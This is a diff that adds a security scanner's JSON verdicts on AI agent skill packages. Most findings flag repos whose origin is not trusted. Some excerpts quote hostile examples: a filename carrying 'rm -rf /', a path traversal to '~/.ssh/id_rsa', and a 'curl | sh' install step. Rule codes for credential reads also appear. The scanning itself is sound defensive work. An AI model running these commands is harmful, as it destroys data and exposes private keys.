+      "ref": "jeffallan/claude-skills@spring-boot-engineer",
+      "skillKey": "spring-boot-engineer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.370Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "sql-pro": {
+      "ref": "jeffallan/claude-skills@sql-pro",
+      "skillKey": "sql-pro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.371Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "swift-expert": {
+      "ref": "jeffallan/claude-skills@swift-expert",
+      "skillKey": "swift-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.372Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "test-master": {
+      "ref": "jeffallan/claude-skills@test-master",
+      "skillKey": "test-master",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.374Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "typescript-pro": {
+      "ref": "jeffallan/claude-skills@typescript-pro",
+      "skillKey": "typescript-pro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.375Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "vue-expert": {
+      "ref": "jeffallan/claude-skills@vue-expert",
+      "skillKey": "vue-expert",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.377Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "websocket-engineer": {
+      "ref": "jeffallan/claude-skills@websocket-engineer",
+      "skillKey": "websocket-engineer",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.378Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "wordpress-pro": {
+      "ref": "jeffallan/claude-skills@wordpress-pro",
+      "skillKey": "wordpress-pro",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:20.382Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jeffallan/claude-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "baoyu-format-markdown": {
+      "ref": "jimliu/baoyu-skills@baoyu-format-markdown",
+      "skillKey": "baoyu-format-markdown",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:22.435Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jimliu/baoyu-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "baoyu-markdown-to-html": {
+      "ref": "jimliu/baoyu-skills@baoyu-markdown-to-html",
+      "skillKey": "baoyu-markdown-to-html",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:22.437Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/jimliu/baoyu-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "design-motion-principles": {
+      "ref": "kylezantos/design-engineer-auditor-package@design-motion-principles",
+      "skillKey": "design-motion-principles",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:27.243Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/kylezantos/design-engineer-auditor-package is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "flutter-animations": {
+      "ref": "madteacher/mad-agents-skills@flutter-animations",
+      "skillKey": "flutter-animations",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:37.055Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/madteacher/mad-agents-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "effect-best-practices": {
+      "ref": "makisuo/skills@effect-best-practices",
+      "skillKey": "effect-best-practices",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:37.438Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/makisuo/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "gsap": {
+      "ref": "martinholovsky/claude-skills-generator@gsap",
+      "skillKey": "gsap",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:37.923Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/martinholovsky/claude-skills-generator is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "tauri": {
+      "ref": "martinholovsky/claude-skills-generator@tauri",
+      "skillKey": "tauri",
+      "verdict": "rejected",
+      "scannedAt": "2026-05-27T02:51:37.924Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/advanced-patterns.md",
+          "excerpt": "ps/tauri-action@v0 env: GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "references/advanced-patterns.md",
+          "excerpt": "GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }} TAURI_SIGNING_PRIVATE_"
+        },
+        {
+          "severity": "critical",
+          "code": "rm_rf_root",
+          "message": "Recursive deletion of root, home, or $HOME — destructive.",
+          "file": "references/threat-model.md",
+          "excerpt": "Attacker provides: filename; rm -rf / 4. Command constructed: open \""
+        },
+        {
+          "severity": "critical",
+          "code": "creds_ssh",
+          "message": "Reads SSH private keys or authorized_keys.",
+          "file": "references/threat-model.md",
+          "excerpt": "Attacker requests path: \"../../.ssh/id_rsa\" 3. Path joins to: $APPDATA/m"
+        },
+        {
+          "severity": "critical",
+          "code": "creds_ssh",
+          "message": "Reads SSH private keys or authorized_keys.",
+          "file": "references/threat-model.md",
+          "excerpt": "joins to: $APPDATA/myapp/../../.ssh/id_rsa 4. Resolves to: ~/.ssh/id_rsa"
+        },
+        {
+          "severity": "critical",
+          "code": "creds_ssh",
+          "message": "Reads SSH private keys or authorized_keys.",
+          "file": "references/threat-model.md",
+          "excerpt": "./.ssh/id_rsa 4. Resolves to: ~/.ssh/id_rsa (outside scope!) 5. Applicati"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/martinholovsky/claude-skills-generator is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "nuxt-seo": {
+      "ref": "onmax/nuxt-skills@nuxt-seo",
+      "skillKey": "nuxt-seo",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:42.274Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/onmax/nuxt-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "payload": {
+      "ref": "payloadcms/skills@payload",
+      "skillKey": "payload",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:51:42.642Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/payloadcms/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "solid": {
+      "ref": "ramziddin/solid-skills@solid",
+      "skillKey": "solid",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:03.926Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/ramziddin/solid-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "banner-creator": {
+      "ref": "resciencelab/opc-skills@banner-creator",
+      "skillKey": "banner-creator",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.260Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/resciencelab/opc-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "domain-hunter": {
+      "ref": "resciencelab/opc-skills@domain-hunter",
+      "skillKey": "domain-hunter",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.261Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/resciencelab/opc-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "producthunt": {
+      "ref": "resciencelab/opc-skills@producthunt",
+      "skillKey": "producthunt",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.262Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/resciencelab/opc-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "requesthunt": {
+      "ref": "resciencelab/opc-skills@requesthunt",
+      "skillKey": "requesthunt",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.263Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "curl_pipe_sh",
+          "message": "Pipes downloaded content directly into a shell/interpreter.",
+          "file": "SKILL.md",
+          "excerpt": "CLI and authenticate: ```bash curl -fsSL https://requesthunt.com/cli | sh requesthunt auth login ``` T"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/resciencelab/opc-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "twitter": {
+      "ref": "resciencelab/opc-skills@twitter",
+      "skillKey": "twitter",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.264Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/resciencelab/opc-skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "rivetkit": {
+      "ref": "rivet-dev/skills@rivetkit",
+      "skillKey": "rivetkit",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.782Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/agent-to-agent.md",
+          "excerpt": "sion(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/agent-to-agent.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); const"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/agent-to-agent.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/agent-to-agent.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); // The writer will c"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/agents/pi.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/agents/pi.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); const { text } = awa"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/agents/pi.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/agents/pi.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY }, }); ``` See the [Pi exten"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/core.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/core.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); // Stream events vm."
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/events.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/events.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); await agent.sendPromp"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/llm-credentials.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/llm-credentials.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); ``` ## Per-tenant cr"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/llm-credentials.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: c.conn.state.anthropicApiKey"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/multiplayer.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/multiplayer.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); await agentA.sendProm"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/multiplayer.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/multiplayer.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); // Observer client ("
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/permissions.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/permissions.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); await agent.sendPromp"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/permissions.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/permissions.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); await agent.sendPromp"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/permissions.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/queues.md",
+          "excerpt": "ession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/queues.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); await age"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/queues.md",
+          "excerpt": "eSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/queues.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); for await (c"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/queues.md",
+          "excerpt": "ession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/quickstart.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/quickstart.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); await agent.sendPromp"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/sessions.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/sessions.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); console.log(session.s"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/sessions.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/sessions.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); ``` ### `cwd` Worki"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/sessions.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/system-prompt.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/system-prompt.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, // Append custom instru"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/tools.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/tools.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); await agent.sendPromp"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/webhooks.md",
+          "excerpt": "ession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/webhooks.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); const res"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/workflows.md",
+          "excerpt": "sion(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/workflows.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); await"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/workflows.md",
+          "excerpt": "sion(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/workflows.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); await"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os/workflows.md",
+          "excerpt": "sion(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, }); const response = awai"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os.md",
+          "excerpt": "NTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY! }, mcpServers: [ {"
+        },
+        {
+          "severity": "warning",
+          "code": "env_credentials",
+          "message": "References a sensitive environment variable. Confirm it's only read in a legitimate context.",
+          "file": "reference/agent-os.md",
+          "excerpt": "reateSession(\"pi\", { env: { ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KE"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "reference/connect/vm-and-bare-metal.md",
+          "excerpt": "d start the service: ```bash sudo systemctl daemon-reload sudo"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "reference/connect/vm-and-bare-metal.md",
+          "excerpt": "sudo systemctl daemon-reload sudo systemctl enable --now rivetk"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "reference/connect/vm-and-bare-metal.md",
+          "excerpt": "environment changes: ```bash sudo systemctl restart rivetkit-ap"
+        },
+        {
+          "severity": "info",
+          "code": "sudo_invocation",
+          "message": "Uses sudo — review what privileged action it needs.",
+          "file": "reference/connect/vm-and-bare-metal.md",
+          "excerpt": "logs when debugging: ```bash sudo journalctl -u rivetkit-app.se"
+        },
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/rivet-dev/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "rivetkit-client-javascript": {
+      "ref": "rivet-dev/skills@rivetkit-client-javascript",
+      "skillKey": "rivetkit-client-javascript",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.784Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/rivet-dev/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "rivetkit-client-react": {
+      "ref": "rivet-dev/skills@rivetkit-client-react",
+      "skillKey": "rivetkit-client-react",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.784Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/rivet-dev/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "rivetkit-client-swift": {
+      "ref": "rivet-dev/skills@rivetkit-client-swift",
+      "skillKey": "rivetkit-client-swift",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.785Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/rivet-dev/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "rivetkit-client-swiftui": {
+      "ref": "rivet-dev/skills@rivetkit-client-swiftui",
+      "skillKey": "rivetkit-client-swiftui",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:32.785Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/rivet-dev/skills is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "content-modeling-best-practices": {
+      "ref": "sanity-io/agent-toolkit@content-modeling-best-practices",
+      "skillKey": "content-modeling-best-practices",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:33.172Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sanity-io/agent-toolkit is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "sanity-best-practices": {
+      "ref": "sanity-io/agent-toolkit@sanity-best-practices",
+      "skillKey": "sanity-best-practices",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:33.179Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
+          "message": "Origin github.com/sanity-io/agent-toolkit is not on the trusted-org allowlist; review the maintainer."
+        }
+      ]
+    },
+    "seo-aeo-best-practices": {
+      "ref": "sanity-io/agent-toolkit@seo-aeo-best-practices",
+      "skillKey": "seo-aeo-best-practices",
+      "verdict": "needs_review",
+      "scannedAt": "2026-05-27T02:52:33.180Z",
+      "findings": [
+        {
+          "severity": "warning",
+          "code": "untrusted_origin",
